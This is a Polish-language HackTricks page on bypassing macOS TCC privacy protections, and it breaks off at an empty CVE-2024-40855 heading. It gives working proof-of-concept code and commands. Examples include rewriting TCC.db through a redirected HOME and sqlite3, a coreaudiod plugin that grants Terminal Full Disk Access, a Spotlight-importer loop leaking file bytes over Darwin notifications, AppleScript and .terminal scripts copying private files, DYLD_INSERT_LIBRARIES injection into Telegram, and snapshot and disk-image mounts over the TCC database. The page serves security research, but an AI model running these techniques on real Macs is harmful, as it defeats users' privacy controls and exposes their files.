# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Według funkcjonalności

### Write Bypass

To nie jest bypass — tak po prostu działa TCC: **nie chroni przed zapisem**. Jeśli Terminal **nie ma dostępu do odczytu pulpitu użytkownika, nadal może zapisywać na nim pliki**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

Atrybut rozszerzony **`com.apple.macl`** jest dodawany do nowego **pliku**, aby zapewnić **aplikacji, która go utworzyła**, dostęp do odczytu.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Możliwe jest **umieszczenie okna nad monitem TCC**, aby użytkownik **zaakceptował** go, nie zauważając tego. PoC znajdziesz w [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Żądanie TCC pod dowolną nazwą

Atakujący może **tworzyć aplikacje o dowolnej nazwie** (np. Finder, Google Chrome...) w pliku **`Info.plist`** i sprawić, by żądały dostępu do lokalizacji chronionej przez TCC. Użytkownik pomyśli, że o dostęp prosi prawdziwa aplikacja.\
Co więcej, można **usunąć prawdziwą aplikację z Docka i umieścić w nim fałszywą**, więc gdy użytkownik kliknie fałszywą aplikację (która może używać tej samej ikony), może ona uruchomić prawdziwą aplikację, zażądać uprawnień TCC i wykonać malware, sprawiając, że użytkownik uwierzy, iż o dostęp poprosiła prawdziwa aplikacja.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Więcej informacji i PoC znajdziesz w:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### Obejście przez SSH

Domyślnie dostęp przez **SSH miał uprawnienie „Full Disk Access”**. Aby to wyłączyć, trzeba pozostawić go na liście, ale go wyłączyć (usunięcie go z listy nie odbierze tych uprawnień):<sup>[[2]](#references)</sup>

![Żądanie TCC pod dowolną nazwą - Obejście przez SSH: Domyślnie dostęp przez SSH miał uprawnienie „Full Disk Access”. Aby to wyłączyć, trzeba pozostawić go na liście, ale go wyłączyć (usunięcie go...](<../../../../../images/image (1077).png>)

Tutaj znajdziesz przykłady **malware, które zdołało obejść tę ochronę**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Pamiętaj, że obecnie, aby móc włączyć SSH, potrzebujesz **Full Disk Access**

### Obsługa rozszerzeń - CVE-2022-26767

Atrybut **`com.apple.macl`** jest nadawany plikom, aby przyznać **określonej aplikacji uprawnienia do ich odczytu.** Atrybut ten jest ustawiany, gdy **przeciągniesz i upuścisz** plik na aplikację lub gdy użytkownik **kliknie dwukrotnie** plik, aby otworzyć go w **domyślnej aplikacji**.

Dlatego użytkownik mógłby **zarejestrować złośliwą aplikację** do obsługi wszystkich rozszerzeń i wywołać Launch Services, aby **otworzyć** dowolny plik (dzięki czemu złośliwa aplikacja uzyska uprawnienia do jego odczytu).<sup>[[23]](#references)</sup>

### iCloud

Dzięki entitlementowi **`com.apple.private.icloud-account-access`** można komunikować się z usługą XPC **`com.apple.iCloudHelper`**, która **udostępnia tokeny iCloud**.

**iMovie** i **Garageband** miały ten entitlement oraz inne, które na to pozwalały.

Więcej **informacji** o exploicie pozwalającym **uzyskać tokeny iCloud** dzięki temu entitlementowi znajdziesz w prezentacji: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Wyciekanie danych przez nazwy powiadomień Darwin w importerze Spotlight

Importer Spotlight może odczytać plik przekazany przez Spotlight do jego callbacku `GetMetadataForFile`, nawet jeśli zwykły proces bez Full Disk Access nie może go odczytać. W przeciwieństwie do [wstrzyknięcia kodu do procesu autoryzowanego przez TCC](../macos-tcc-credential-and-data-theft.md), ta metoda wymaga lokalnego dostępu, który umożliwia zainstalowanie importera i wywołanie odpowiedniego zdarzenia indeksowania Spotlight. Importer działa w sandboxie, ale powiadomienia Darwin zawierające tylko nazwę mogą przekazywać bajty do odbiornika poza tym sandboxem. Jest to kanał wycieku danych, a nie sposób na uzyskanie uprawnień root ani dowolnego dostępu do plików z poziomu importera.<sup>[[24]](#references)</sup>

Zadeklaruj typ pliku docelowego w `CFBundleDocumentTypes` → `LSItemContentTypes` w pliku `Info.plist` importera, a następnie zainstaluj pakiet w `~/Library/Spotlight/` lub w `Contents/Library/Spotlight/` aplikacji. Sprawdź rejestrację poleceniem `mdimport -L`. Sekcja [importerów Spotlight](../../../../macos-auto-start-locations.md#spotlight-plugins) omawia lokalizację pakietu i dopasowywanie typów plików. Importer otrzymuje tylko pliki, dla których Spotlight go wybierze; istniejący importer ma na ogół pierwszeństwo. W macOS 26 Tahoe polecenie `mdimport -i` nie wymuszało niezawodnie natychmiastowego, rekurencyjnego indeksowania w opisanych testach, natomiast `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` żądało ponownego zaimportowania UTI obsługiwanych przez ten importer.<sup>[[24]](#references)</sup>

Aby przetestować kanał, uruchom odbiornik poza sandboxem poleceniem `notifyutil -w TEST_TEST_TEST`, a następnie wyślij powiadomienie za pomocą `CFNotificationCenterGetDarwinNotifyCenter()` oraz wartości `NULL` dla obiektu i `userInfo`. W odróżnieniu od powiadomienia rozproszonego z ładunkiem `userInfo`, powiadomienie Darwin zawiera tylko nazwę. W przypadku danych binarnych zarejestruj zewnętrzny odbiornik dla nazw dziesiętnych od `0` do `255`, używając `notify_register_dispatch`; przypisz każdą rejestrację callbacku do odpowiadającej jej wartości bajtu. W `GetMetadataForFile` odczytaj tylko przekazaną przez Spotlight ścieżkę `pathToFile` i wyślij każdy bajt jako nazwę powiadomienia zapisaną w systemie dziesiętnym:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Listener odtwarza sekwencję bajtów, zamiast odczytywać sam chroniony przez TCC plik. Opublikowany PoC odzyskał pierwsze 64 bajty pliku `knowledgeC.db` z terminala bez FDA, przy włączonym SIP, na macOS 26. Ma to niską przepustowość i nie jest niezawodną metodą masowego kopiowania: Spotlight może nie indeksować ani nie ponownie indeksować pliku docelowego, a równoczesne instancje importerów mogą przeplatać strumienie powiadomień. Zobacz [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/), aby poznać inne mechanizmy przekraczania granic sandboxa.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automatyzacja

Aplikacja z uprawnieniem **`kTCCServiceAppleEvents`** będzie mogła **sterować innymi aplikacjami**. Oznacza to, że może **nadużywać uprawnień przyznanych innym aplikacjom**.<sup>[[2]](#references)</sup>

Więcej informacji o AppleScriptach znajdziesz tutaj:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Na przykład aplikacja z **uprawnieniem Automatyzacja dla `iTerm`** może sterować tą aplikacją. W tym przykładzie **`Terminal`** ma dostęp do iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Za pośrednictwem iTerm

Terminal, który nie ma FDA, może wywołać iTerm, który je ma, i użyć go do wykonania działań:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Za pośrednictwem Findera

Lub jeśli aplikacja ma dostęp do Findera, może uruchomić skrypt taki jak ten:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Zachowanie aplikacji

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Działający w przestrzeni użytkownika **daemon tccd** używał zmiennej **`HOME`** **env**, aby uzyskać dostęp do bazy danych TCC użytkownika pod ścieżką: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Zgodnie z [tym wpisem na Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) oraz ponieważ daemon TCC działa za pośrednictwem `launchd` w domenie bieżącego użytkownika, można **kontrolować wszystkie przekazywane mu zmienne środowiskowe**.<sup>[[19]](#references)</sup>\
W związku z tym **atakujący może ustawić zmienną środowiskową `$HOME`** w **`launchctl`**, aby wskazywała na **kontrolowany** **katalog**, **uruchomić ponownie** daemon **TCC**, a następnie **bezpośrednio zmodyfikować bazę danych TCC**, aby przyznać sobie **wszystkie dostępne uprawnienia TCC**, bez wyświetlania prośby użytkownikowi końcowemu.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes miało dostęp do lokalizacji chronionych przez TCC, ale nowo utworzona notatka była **zapisywana w niechronionej lokalizacji**. Dlatego atakujący mógł polecić Notes skopiowanie chronionego pliku do notatki, a następnie uzyskać dostęp do powstałych danych w niechronionej lokalizacji:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Plik binarny `/usr/libexec/lsd` z biblioteką `libsecurity_translocate` miał entitlement `com.apple.private.nullfs_allow`, który pozwalał mu tworzyć mounty **nullfs**, oraz entitlement `com.apple.private.tcc.allow` z **`kTCCServiceSystemPolicyAllFiles`**, który umożliwiał dostęp do wszystkich plików.

Można było dodać atrybut kwarantanny do „Library”, wywołać usługę XPC **`com.apple.security.translocation`**, a następnie Library był mapowany na **`$TMPDIR/AppTranslocation/d/d/Library`**, skąd można było **uzyskać dostęp** do wszystkich dokumentów znajdujących się w Library.

### CVE-2024-44131 - FileProvider symlink race

Aplikacje przekazujące operacje na plikach **uprzywilejowanemu helperowi** (tutaj **`fileproviderd`** / `Files.app`) kopiują lub przenoszą elementy **w imieniu użytkownika**, więc kopia jest wykonywana z uprawnieniami helpera, a nie wywołującego.

Jamf Threat Labs pokazało, że walidację symlinka przeprowadzaną przed operacją można **wyścignąć**: zamiast umieszczać symlink w **ostatnim** komponencie ścieżki (który jest sprawdzany), atakujący podmienia **pośredni** katalog ścieżki **po rozpoczęciu kopiowania**. Uprzywilejowany helper podąża wtedy za linkiem kontrolowanym przez atakującego i odczytuje/zapisuje lokalizacje chronione przez TCC **bez wyświetlania monitu**.<sup>[[5]](#references)</sup>

Katalogi, których ścieżka **nie** jest chroniona losowym UUID (na przykład `~/Library/Mobile Documents/com~apple~CloudDocs`), są najłatwiejszym celem, ponieważ atakujący może przewidzieć pełną ścieżkę, aby przeprowadzić race condition.

> [!TIP]
> To ogólny schemat, którego warto szukać: **każdy uprzywilejowany proces, który rozwiązuje ścieżkę więcej niż raz** (sprawdzenie przed użyciem albo osobne rozwiązywanie ścieżek źródłowej i docelowej przez `rename()`/`copyfile()`), można zaatakować, podmieniając katalog znajdujący się pośrodku ścieżki. Tylko `O_NOFOLLOW_ANY`, `openat()` na już otwartym deskryptorze katalogu (FD) albo `realpath()` + ponowna walidacja rzeczywiście zamykają tę lukę.

Więcej informacji w [**opisie Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` można zbudować z opcją `SQLITE_ENABLE_SQLLOG`, która dodaje mechanizm logowania sterowany zmiennymi środowiskowymi ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – dla **każdej otwartej bazy danych** w `path` zapisywana jest **kopia pliku bazy danych** oraz log instrukcji SQL (katalog musi już istnieć).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – za każdym razem, gdy baza danych jest otwierana/dołączana, twórz **nową kopię** zamiast ponownie używać istniejącej.
- **`SQLITE_SQLLOG_CONDITIONAL`** – loguj połączenie tylko wtedy, gdy obok głównej bazy danych znajduje się plik `<database>-sqllog`.

Jeśli uda ci się wstrzyknąć tę zmienną do procesu, który ma **FDA** i otwiera bazy SQLite, bez problemu **skopiuje on te chronione bazy danych** do katalogu, nad którym masz kontrolę. Ponieważ nazwa pliku docelowego jest wyprowadzana z danych kontrolowanych przez atakującego, **symlink umieszczony w miejscu docelowym** zmienia ten sam mechanizm w **dowolny zapis pliku** z uprawnieniami procesu docelowego.

### **SQLITE_AUTO_TRACE**

Jeśli ustawiono zmienną środowiskową **`SQLITE_AUTO_TRACE`**, biblioteka **`libsqlite3.dylib`** zacznie **logować** wszystkie zapytania SQL. Z tej biblioteki korzystało wiele aplikacji, więc można było logować wszystkie ich zapytania SQLite.<sup>[[22]](#references)</sup>

Kilka aplikacji Apple korzystało z tej biblioteki, aby uzyskiwać dostęp do informacji chronionych przez TCC.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Wyszukiwanie zapisów plików sterowanych zmiennymi środowiskowymi

Dwa poprzednie przykłady wykorzystują tę samą ogólną technikę, dlatego warto poszukać kolejnych: **frameworki ładowane przez aplikacje z uprawnieniami TCC często udostępniają zmienne środowiskowe do debugowania/logowania, które powodują, że proces tworzy plik we wskazanej przez użytkownika lokalizacji**.

Procedura wyszukiwania:

1. Wybierz cel z uprawnieniem FDA lub innym atrakcyjnym uprawnieniem TCC (`Music`, `TV`, `Terminal`, agenci MDM...) i wyświetl listę powiązanych z nim frameworków (`otool -L`, `vmmap`).
2. Przeszukaj te frameworki pod kątem ciągów `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Ustaw kandydackie zmienne za pomocą `launchctl setenv NAME /path/you/control`, uruchom aplikację i obserwuj jej operacje na systemie plików za pomocą `fs_usage -w -f filesys <pid>` lub `sudo fs_usage | grep <path>`.
4. Jeśli proces **tworzy plik lub zmienia jego nazwę** w Twoim katalogu, masz prymityw zapisu: ustaw lokalizację docelową na symlink (lub przeprowadź wyścig katalogu pośredniego, jak w opisanym wyżej CVE-2024-44131), aby przekierować zapis do `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Ograniczają to dwie rzeczy. Po pierwsze, **zmienne `DYLD_*` są ignorowane w przypadku plików binarnych z hardened runtime**, chyba że aplikacja ma entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) („wartość logiczna wskazująca, czy na aplikację mogą wpływać zmienne środowiskowe dynamic linker, których można użyć do wstrzyknięcia kodu do procesu aplikacji”) — zobacz też [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Po drugie, Apple usuwa poszczególne zmienne debugowania frameworków, gdy tylko zostaną zgłoszone, więc zmienna działająca w jednej wersji macOS często znika w następnej. Jeśli aplikacja po ustawieniu takiej zmiennej po cichu odmawia uruchomienia, uznaj, że ta zmienna została już odfiltrowana.<sup>[[7]](#references)[[8]](#references)</sup>

Zobacz [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md), gdzie opisano analogiczną sztuczkę wykorzystującą zmienne linkera.

### Apple Remote Desktop

Jako root możesz włączyć tę usługę, a **agent ARD będzie miał pełny dostęp do dysku**. Użytkownik może następnie wykorzystać to do skopiowania nowej **bazy danych TCC użytkownika**.

## Za pomocą **NFSHomeDirectory**

TCC używa bazy danych w katalogu HOME użytkownika do kontrolowania dostępu do zasobów specyficznych dla tego użytkownika: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Jeśli więc użytkownik zdoła ponownie uruchomić TCC ze zmienną środowiskową $HOME wskazującą **inny katalog**, może utworzyć nową bazę danych TCC w **/Library/Application Support/com.apple.TCC/TCC.db** i nakłonić TCC do przyznania dowolnej aplikacji dowolnego uprawnienia TCC.

> [!TIP]
> Apple używa ustawienia zapisanego w profilu użytkownika, w atrybucie **`NFSHomeDirectory`**, jako **wartości `$HOME`**. Jeśli więc przejmiesz aplikację z uprawnieniami do modyfikowania tej wartości (**`kTCCServiceSystemPolicySysAdminFiles`**), możesz **wykorzystać** tę opcję do obejścia TCC.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Pierwszy POC** używa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), aby zmodyfikować katalog **HOME** użytkownika.

1. Pobierz blob _csreq_ dla docelowej aplikacji.
2. Umieść fałszywy plik _TCC.db_ z wymaganymi uprawnieniami i blobem _csreq_.
3. Wyeksportuj wpis użytkownika z Directory Services za pomocą [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Zmodyfikuj wpis Directory Services, aby zmienić katalog domowy użytkownika.
5. Zaimportuj zmodyfikowany wpis Directory Services za pomocą [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zatrzymaj _tccd_ użytkownika i ponownie uruchom proces.

Drugi POC wykorzystywał **`/usr/libexec/configd`**, który miał `com.apple.private.tcc.allow` z wartością `kTCCServiceSystemPolicySysAdminFiles`.\
Możliwe było uruchomienie **`configd`** z opcją **`-t`**, która pozwalała atakującemu wskazać **niestandardowy Bundle do załadowania**. Wykorzystując to, exploit **zastępuje** metodę zmiany katalogu domowego użytkownika za pomocą **`dsexport`** i **`dsimport`** wstrzyknięciem kodu do **`configd`**.

Więcej informacji znajdziesz w [**oryginalnym raporcie**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Za pomocą wstrzykiwania procesu

Istnieją różne techniki wstrzykiwania kodu do procesu i wykorzystywania jego uprawnień TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Ponadto najczęściej spotykaną metodą wstrzykiwania procesu w celu obejścia TCC są **wtyczki (ładowane biblioteki)**.\
Wtyczki to dodatkowy kod, zwykle w postaci bibliotek lub plików plist, który jest **ładowany przez główną aplikację** i wykonuje się w jej kontekście. Jeśli więc główna aplikacja miała dostęp do plików objętych ograniczeniami TCC (dzięki przyznanym uprawnieniom lub entitlementom), **niestandardowy kod również będzie go mieć**.

### CVE-2020-27937 - Directory Utility

Aplikacja `/System/Library/CoreServices/Applications/Directory Utility.app` miała entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, ładowała wtyczki z rozszerzeniem **`.daplug`** i **nie korzystała z hardened runtime**.

Aby wykorzystać tę lukę, **zmienia się** wartość **`NFSHomeDirectory`** (nadużywając wspomnianego entitlementu), aby **przejąć bazę danych TCC użytkownika** i obejść TCC.

Więcej informacji znajdziesz w [**oryginalnym raporcie**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Plik binarny **`/usr/sbin/coreaudiod`** miał entitlementy `com.apple.security.cs.disable-library-validation` oraz `com.apple.private.tcc.manager`. Pierwszy **umożliwiał wstrzyknięcie kodu**, a drugi dawał mu dostęp do **zarządzania TCC**.

Ten plik binarny umożliwiał ładowanie **wtyczek firm trzecich** z katalogu `/Library/Audio/Plug-Ins/HAL`. Dzięki temu można było **załadować wtyczkę i wykorzystać uprawnienia TCC** za pomocą tego POC:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Więcej informacji znajdziesz w [**oryginalnym raporcie**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Warstwa abstrakcji urządzeń (DAL) Plug-Ins

Aplikacje systemowe, które otwierają strumień z kamery za pośrednictwem Core Media I/O (aplikacje z **`kTCCServiceCamera`**), ładują te wtyczki do procesu z lokalizacji `/Library/CoreMediaIO/Plug-Ins/DAL` (nie jest ona chroniona przez SIP).

Wystarczy umieścić tam bibliotekę ze standardowym **konstruktorem**, aby **wstrzyknąć kod**.

Kilka aplikacji Apple było podatnych na ten problem.

### Firefox

Aplikacja Firefox miała uprawnienia `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Więcej informacji o tym, jak łatwo to wykorzystać, znajdziesz w [**oryginalnym raporcie**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Plik binarny `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` miał entitlements **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, które umożliwiały wstrzyknięcie kodu do procesu i wykorzystanie uprawnień TCC.

### CVE-2023-26818 - Telegram

Telegram miał entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, więc można było je wykorzystać, aby **uzyskać dostęp do jego uprawnień**, na przykład do nagrywania za pomocą kamery. [**Payload znajdziesz w opisie**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Zwróć uwagę, że do załadowania biblioteki za pomocą zmiennej środowiskowej utworzono **niestandardowy plik plist**, aby wstrzyknąć tę bibliotekę, a do jej uruchomienia użyto **`launchctl`**:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Przez wywołania open

Możliwe jest wywołanie **`open`** nawet w sandboxie

### Skrypty Terminala

Dość często przyznaje się Terminalowi **Pełny dostęp do dysku (FDA)**, przynajmniej na komputerach używanych przez osoby z branży technicznej. Można też za jego pomocą wywoływać skrypty **`.terminal`**.

Skrypty **`.terminal`** to pliki plist, takie jak ten, zawierające polecenie do wykonania w kluczu **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Aplikacja mogłaby zapisać skrypt terminala w lokalizacji takiej jak /tmp i uruchomić go poleceniem takim jak:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Przez montowanie

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Każdy użytkownik** (nawet nieuprzywilejowany) może utworzyć i zamontować snapshot Time Machine, a następnie uzyskać dostęp do **WSZYSTKICH plików** w tym snapshocie.\
Jedynym wymaganym uprawnieniem jest przyznanie aplikacji (np. `Terminal`) dostępu **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), co musi zrobić administrator.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Bardziej szczegółowe wyjaśnienie można [**znaleźć w oryginalnym raporcie**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 i CVE-2021-30808 - Mount na pliku TCC

Nawet jeśli plik bazy danych TCC był chroniony, możliwe było **zamontowanie nowego pliku TCC.db na katalogu**:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Sprawdź **pełny exploit** w [**oryginalnym opisie**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

